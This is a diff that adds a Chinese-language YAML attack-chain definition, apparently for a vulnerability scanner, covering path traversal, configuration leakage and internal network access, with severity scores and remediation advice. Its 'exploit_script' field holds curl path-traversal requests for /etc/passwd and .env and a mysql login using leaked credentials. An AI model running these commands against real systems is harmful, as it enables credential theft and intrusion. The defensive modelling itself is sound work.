@@ -1,0 +1,42 @@
+id: CHAIN-007
+name: "路径遍历 → 配置泄露 → 内网渗透"
+severity: HIGH
+cvss: 7.5
+epss: 0.60
+
+steps:
+  - step: 1
+    name: "路径遍历漏洞"
+    rule: py.path.traversal
+    description: "文件路径拼接用户输入"
+    condition: "open(用户输入) 无路径验证"
+
+  - step: 2
+    name: "配置文件泄露"
+    rule: config_leak
+    description: "读取敏感配置文件"
+    condition: "读取 /etc/passwd, .env, config.yaml"
+
+  - step: 3
+    name: "内网渗透"
+    rule: internal_access
+    description: "利用泄露的凭证访问内网"
+    condition: "数据库密码、API密钥等"
+
+exploit_script: |
+  # Step 1: 路径遍历
+  curl "https://target.com/download?file=../../../etc/passwd"
+
+  # Step 2: 读取配置
+  curl "https://target.com/download?file=../../../app/.env"
+
+  # Step 3: 利用凭证
+  mysql -h db.internal -u root -p<leaked_password>
+
+remediation:
+  priority: P1
+  effort: "2小时"
+  suggestions:
+    - "使用os.path.abspath()验证路径在允许目录内"
+    - "实施路径白名单"
+    - "敏感配置使用环境变量而非文件"
